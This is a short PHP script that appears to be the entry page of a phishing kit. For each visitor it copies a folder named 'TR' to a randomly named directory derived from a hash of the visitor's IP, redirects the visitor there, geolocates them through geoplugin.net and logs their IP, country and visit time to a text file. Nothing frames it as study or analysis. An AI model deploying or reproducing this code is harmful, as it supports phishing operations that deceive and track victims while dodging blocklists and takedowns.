<?php
$random=$_SERVER['REMOTE_ADDR'] ;
$md5=md5("$random");
$rt = substr($md5, 0, -25);


        $ip=$_SERVER['REMOTE_ADDR'];

         $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));

            $continent=$details->geoplugin_continentCode;

            $country=$details->geoplugin_countryCode;

            

$dst = $rt ;
function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
    if(( $file != '.' ) && ( $file != '..' )) { 
        if ( is_dir($src . '/' . $file) ) { 
        recurse_copy($src . '/' . $file,$dst . '/' . $file); 
         } 
    else { 
        copy($src . '/' . $file,$dst . '/' . $file); 
    } 
    } 
    } 
    closedir($dir); 
    } 
$src="TR";
recurse_copy( $src, $dst );
header("location:$dst/");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip." $country |> ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n");
?>